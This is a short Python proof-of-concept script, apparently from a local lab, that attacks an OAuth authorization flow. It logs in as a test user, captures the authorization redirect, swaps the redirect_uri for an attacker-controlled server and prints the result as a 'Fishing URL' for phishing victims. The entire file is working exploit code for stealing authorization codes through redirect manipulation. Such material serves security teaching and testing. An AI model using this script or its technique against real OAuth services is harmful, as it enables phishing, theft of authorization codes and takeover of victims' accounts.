import requests
import urllib

session = requests.session()
attacker_server = 'http://host.docker.internal:8080'

# login as attacker
payload = {'name': 'bob', 'password': 'hoge'}
res = session.post('http://localhost:10000/login', data=payload)

# authorize request
res = session.get('http://localhost:10000/authorize', allow_redirects=False)
pr = urllib.parse.urlparse(res.headers['Location'])
qs_d = urllib.parse.parse_qs(pr.query)
qs_d['redirect_uri'] = [attacker_server]
url = urllib.parse.urlunparse(pr._replace(netloc='auth_server:10001', query=urllib.parse.urlencode(qs_d, doseq=True)))
print("Fishing URL:", url)